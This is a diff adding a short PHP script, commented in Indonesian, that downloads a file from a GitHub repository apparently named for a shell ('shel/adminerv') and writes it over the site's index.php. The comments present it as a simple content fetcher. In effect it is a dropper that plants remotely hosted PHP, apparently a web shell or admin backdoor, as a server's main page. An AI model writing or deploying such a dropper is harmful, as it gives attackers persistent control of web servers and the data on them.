@@ -1,0 +1,20 @@
+<?php
+// URL website yang ingin Anda ambil kontennya
+$url = 'https://raw.githubusercontent.com/sekjhhh/shel/refs/heads/main/adminerv'; // Ganti dengan URL yang Anda inginkan
+
+// Mengambil konten dari URL
+$content = file_get_contents($url);
+
+// Memeriksa apakah konten berhasil diambil
+if ($content === FALSE) {
+    die('Gagal mengambil konten dari URL.');
+}
+
+// Menyimpan konten ke file index.php
+$file = 'index.php';
+if (file_put_contents($file, $content) !== FALSE) {
+    echo 'File index.php berhasil dibuat.';
+} else {
+    echo 'Gagal menyimpan konten ke file index.php.';
+}
+?>
